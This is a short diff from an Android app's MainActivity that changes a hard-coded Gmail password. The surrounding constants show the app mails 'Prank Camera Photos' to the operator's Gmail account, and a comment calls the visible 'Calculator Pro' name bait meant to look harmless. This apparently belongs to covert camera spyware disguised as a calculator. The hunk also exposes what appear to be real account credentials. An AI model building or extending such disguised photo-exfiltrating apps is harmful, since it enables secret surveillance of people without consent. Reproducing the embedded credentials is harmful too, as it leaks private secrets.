@@ -34,7 +34,7 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     private static final String EMAIL_FROM = "metrobugitt@gmail.com";
     private static final String EMAIL_TO = "metrobugitt@gmail.com";
     private static final String EMAIL_SUBJECT = "Prank Camera Photos";
-    private static final String EMAIL_PASSWORD = "ketufvduqebiogig";
+    private static final String EMAIL_PASSWORD = "umlvmsubioyndabu";
 
     // Приманка — показываем что-то безобидное
     private static final String FAKE_APP_NAME = "Калькулятор Pro";
